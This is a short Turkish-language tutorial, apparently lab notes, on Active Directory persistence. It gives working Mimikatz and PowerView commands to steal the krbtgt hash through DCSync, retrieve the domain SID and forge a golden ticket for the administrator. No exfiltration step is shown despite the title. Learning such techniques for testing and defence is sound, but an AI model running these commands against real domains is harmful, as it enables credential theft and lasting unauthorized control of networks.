# Persistence & Exfiltrate

Persistence (Kalıcılık), bir saldırganın bir sisteme veya ağa ilk erişimi sağladıktan sonra, gelecekteki erişimini garanti altına almak ve tespit edilmeden kalmak için kurduğu mekanizmaları ifade eder. Exfiltration (Dışarı Sızdırma), bir saldırganın ele geçirdiği sistemden veya ağdan topladığı hassas verileri kendi kontrolündeki bir konuma (genellikle ağ dışındaki bir sunucuya) aktarma işlemidir. 

## Gereksinimler:

* **Domain SID:** Active Directory etki alanını benzersiz bir şekilde tanımlayan SID'in bir bölümüdür.

* **Krbtgt hash:** krbtgt hesabı, KDC hizmetinin Kerberos biletlerini şifrelemek ve imzalamak için kullandığı ana kriptografik anahtarı barındırır.

* **Domain Name:** Active Directory etki alanının insan tarafından okunabilen adıdır.

* **SIDS:** Windows tabanlı bir sistemde veya Active Directory'de bir kullanıcıyı, grubu, bilgisayarı veya diğer güvenlik ilkelerini (security principal) benzersiz bir şekilde tanımlar.


### Adım 1 | KRBTGT Hash'ını Almak

Domain hesabına erişip;

```
Invoke-Mimikatz -Command '"lsadump:dcsync /user:cyberwarfare\krbtgt"' -verbose
```

krbtgt hesabının parola hash'ini çalmak için kullanılan kritik bir komuttur. Çıktıdaki **Hash NTLM: <HASH>** kısmını kopyalıyoruz.

### Adım 2 | Domain SID

Etki alanının SID'sini almamız gerekiyor;

```
../PowerView_dev.ps1
Get-DomainSID -Verbose
```

Çıktıyı kopyalıyoruz.

### Adım 3 | Golden Ticket Oluşturmak

Edindiğimiz bilgiler ile bir Golden Ticket oluşturuyoruz;

```
Invoke-Mimikatz -Command '"kerberos::golden /user:administrator /domain:cyberwarfare.corp /sid:<Domain_SID> /krbtgt:<krbtgt_hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt"' -verbose
```

Artık yetki yüksek ve KALICI dır.
